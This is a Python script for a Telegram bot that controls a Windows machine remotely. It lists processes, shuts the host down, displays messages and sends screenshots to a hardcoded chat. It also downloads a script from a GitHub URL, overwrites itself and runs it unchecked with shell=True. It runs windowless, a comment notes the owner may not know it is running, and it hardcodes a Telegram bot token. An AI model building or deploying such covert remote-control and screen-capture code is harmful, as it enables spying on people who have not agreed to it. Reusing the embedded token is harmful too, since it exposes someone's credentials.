import urllib3 
import regex
import subprocess
import logging
import sys
import subprocess
import pkg_resources
import psutil
import datetime
from messages import TelegramBot
import os
from tkinter import messagebox
import pyautogui
from subprocess import call
from telegram import ForceReply, Update
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters



class logger:


    def __init__(self,_log_file,_global_severity=0 ,_logobj= str):
        self._logobj=_logobj
        self._global_severity=_global_severity
        self._log_file=_log_file
    

    def info(self,_function_name,_message):
        import time
        log_file=open(self._log_file,"a+")
        log_file.write("\n"+time.ctime()+" at "+str(time.perf_counter_ns())+"    "+_function_name+"   called (local_severity=INFO)with message:  "+_message)
        log_file.close()


    def warning(self,_function_name,_message):
        import time
        log_file=open(self._log_file,"a+")
        log_file.write("\n"+time.ctime()+" at "+str(time.perf_counter_ns())+"    "+_function_name+"   called (local_severity=WARNING)with message:  "+_message)
        log_file.close()

    def critical(self,_function_name,_message):
        import time
        log_file=open(self._log_file,"a+")
        log_file.write("\n"+time.ctime()+" at "+str(time.perf_counter_ns())+"    "+_function_name+"   called (local_severity=CRITICAL)with message:  "+_message)
        log_file.close()
 

    def producelog(self):
        log_file=open(self._log_file,"r")
        msg=log_file.readlines()
        log_file.close()
        return msg
    

    def privilege(self):
        if self._global_severity==0:
            print("This logger is at the highest privilege level")
        else:
            return self._global_severity
        
    def identify(self):
        print(self._logobj)





__version__=1.01


file=sys.argv[0] 
#Token for the telegram bot.
token="6199318379:AAGmrDxxhYeYWabD8MqyrMMwKvVztDkPhGE"
#url for online update source
url="https://raw.githubusercontent.com/Mainakdey1/pcecho-python/main/finalmodule.pyw"





    




logins=logger("logfile.txt",0,"globallogger")



try:
    required={"python-telegram-bot","psutil","datetime","messages"}
    installed={pkg.key for pkg in pkg_resources.working_set}
    missing=required-installed
    if missing:
        subprocess.check_call([sys.executable,"-m","pip","install",*missing])
    logins.info("PACKAGE INSTALLER","PACKAGES INSTALLED")

except:
    logins.critical("PACKAGE INSTALLER","PACKAGES NOT INITIALIZED")
    





try:

    connection_pool=urllib3.PoolManager()
    resp=connection_pool.request("GET",url)
    match_regex=regex.search(r'__version__*= *(\S+)', resp.data.decode("utf-8"))
    logins.info("CONNECTION OBJECT","CONNECTION OBJECT INITIALIZED")
except:
    logins.critical("CONNECTION OBJECT","CONNECTION OBJECT NOT INITIALIZED")







match_regexno=float(match_regex.group(1))

if match_regexno>__version__:

    try:

    
        #new version available. update immediately
        logins.info("REGEX VERSION MATCH","NEW VERSION FOUND")
        origin_file=open(file,"wb")
        origin_file.write(resp.data)
        origin_file.close()
        logins.info("REGEX VERSION MATCH","SUCCESFUL")
        subprocess.call(file,shell=True)
        

    except:
        logins.critical("REGEX VERSION MATCH","UNSUCCESFUL")
elif match_regexno<__version__:
    try:

        #version rollback initiated. updating to old version
        logins.info("REGEX VERSION MATCH","NEW VERSION FOUND")
        origin_file=open(file,"wb")
        origin_file.write(resp.data)
        origin_file.close()
        logins.info("REGEX VERSION MATCH","VERSION ROLLBACK INITIATED")
        subprocess.call(file,shell=True)
    except:
        logins.critical("REGEX VERSION MATCH","UNSUCCESFUL")
else:
    #no new version found. 
    #update not called.
    logins.info("REGEX VERSION MATCH","NO NEW VERSION FOUND")

    #rest of the code
    
   
    

    #Unit test for checking that essential modules are present01



    #Unit test for checking and matching telegram version02

    from telegram import __version__ as TG_VER

    try:
        from telegram import __version_info__
    except ImportError:
        __version_info__ = (0, 0, 0, 0, 0)  # type: ignore[assignment]
        logins.critical("PTB VERSION MATCH","VERSION NOT FOUND")

    if __version_info__ < (20, 0, 0, "alpha", 1):
        logins.critical("PTB VERSION MATCH","INCOMPATIBLE VERSIONS FOUND")
        raise RuntimeError(
            f"This example is not compatible with your current PTB version {TG_VER}. To view the "
            f"{TG_VER} version of this example, "
            f"visit https://docs.python-telegram-bot.org/en/v{TG_VER}/examples.html"
            
        )




    #Module import







        

    # Enable logging
    logging.basicConfig(
        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
    )
    logger = logging.getLogger(__name__)


    # Define a few command handlers. These usually take the two arguments update and
    # context.

    #Function definition start. Call /start in the chat with the bot to start the bot.
    async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Send a message when the command /start is issued."""
        try:
            user = update.effective_user
            await update.message.reply_html(
                rf"Hi {user.mention_html()}!",
                reply_markup=ForceReply(selective=True),
            )
            logins.info("FUNC START","START INITIATED")
        except:
            logins.warning("FUNC START","FUNCTION NON RESPONSIVE")

    #Function definition of help command. Call the help command to see the available function calls to the bot.





    async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Send a message when the command /help is issued."""
        try:
            await update.message.reply_text("Help!")
            logins.info("FUNC HELP","HELP INITIATED")
        except:
            logins.warning("FUNC HELP","FUNCTION NON RESPONSIVE")

    #Tertiary function defintions
   
   
   
   
   
    #Function definition getupdate. Call /getupdate in the chat with the bot to get a list of all proccesses running in the host system during the time of the function call.
    async def getupdate(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        try:
            btime=psutil.boot_time()
            ftime=datetime.datetime.fromtimestamp(btime).strftime("%Y-%m-%d %H:%M:%S")
            processdict=[ftime,"\n\n"]
            for process in psutil.process_iter():
                processdict+=[process.name(),]
            await update.message.reply_text(processdict)

            logins.info("FUNC GETUPDATE","GETUPDATE INITIATED")
        except:
            logins.warning("FUNC GETUPDATE","FUNCTION NON RESPONSIVE")


    
    
    
    #Function definition shutdown. Call /shutdown to shutdown the host system. Caution: This will stop the script and service to the bot will be terminated.
    async def shutdown(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        try:

            os.system('shutdown -s -t 0')
            logins.info("FUNC SHUTDOWN","SHUTDOWN INITIATED")
        except:
            logins.warning("FUNC SHUTDOWN","FUNCTION NON RESPONSIVE")




    #Function definition of Cpu time. Call /cpu_time to get the percentage of CPU used at the time the function is called.
    async def cpu_time(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        try:

            await update.message.reply_text(psutil.cpu_percent())
            logins.info("FUNC CPU_TIME","CPU_TIME INITIATED")
        except:
            logins.warning("FUNC CPU_TIME","FUNCTION NON RESPONSIVE")




    #Function definition of message. This is not a command. Any message typed to the bot that is not a command gets displayed to the host system's screen(if there is one present)
    #bit of a spooky function if the host system's owner does not know about the program running in the background.
    async def show_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        try:
            _message=update.message.text
            messagebox.showinfo("Messenger from Alexandria",_message)
            
            #toaster=ToastNotifier()                  deprecated
            #toaster.show_toast("Windows",_message)  
            logins.info("FUNC SHOW_MESSAGE","SHOW_MESSAGE INTIATED")
        except:
            logins.warning("FUNC SHOW_MESSAGE","FUNCTION NON RESPONSIVE")

   
   
   
   
   
   
    #Function definition of screenshot method. Call /sc to grab a new screenshot of the host system's screen. However this is still in development and the screenshot may not be of the 
    #resolution of the host system's screen.
    async def image_grab(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
            
        try:
            img_grab=pyautogui.screenshot()
            img_grab.save("image1.png")
            await update.message._bot.sendDocument(update.message.chat_id,open("image1.png","rb"))
            print("sent")
            logins.info("FUNC IMAGE_GRAB","IMAGE_GRAB INITIATED")
        except:
            logins.warning("FUNC IMAGE_GRAB","FUNCTION NON RESPONSIVE")



    
    #Main

    def main() -> None:
        """Start the bot."""
        # Create the Application and pass it the bot's token.
        application = Application.builder().token(token).build()
        logins.info("MAIN","APPLICATION SUCCESSFULLY BUILT")

        # on different commands - answer in Telegram
        application.add_handler(CommandHandler("start", start))  #type /start
        application.add_handler(CommandHandler("help", help_command)) #type /help
        application.add_handler(CommandHandler("shutdown",shutdown)) #type /shutdown
        application.add_handler(CommandHandler("cpu",cpu_time)) #type /cpu
        application.add_handler(CommandHandler("getupdate",getupdate)) #type /getupdate
        application.add_handler(CommandHandler("sc",image_grab)) #type /sc
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, show_message))


        # Run the bot until the user presses Ctrl-C
        try:

            application.run_polling()
            logins.info("MAIN","APPLICATION POLLING")
        except:
            logins.critical("MAIN","ERROR OCCURED WHILE ATTEMPTING TO POLL APPLICATION")
    try:

        btime=datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
        messageobj=TelegramBot(auth=token,chat_id='820919205',body='The service was started at'+' '+btime)
        messageobj.send()
        logins.info("MAIN","COMMAND LINE INITIATED")
    except:
        logins.critical("MAIN","UNKNOW ERROR")
    if __name__ == "__main__":

        main()






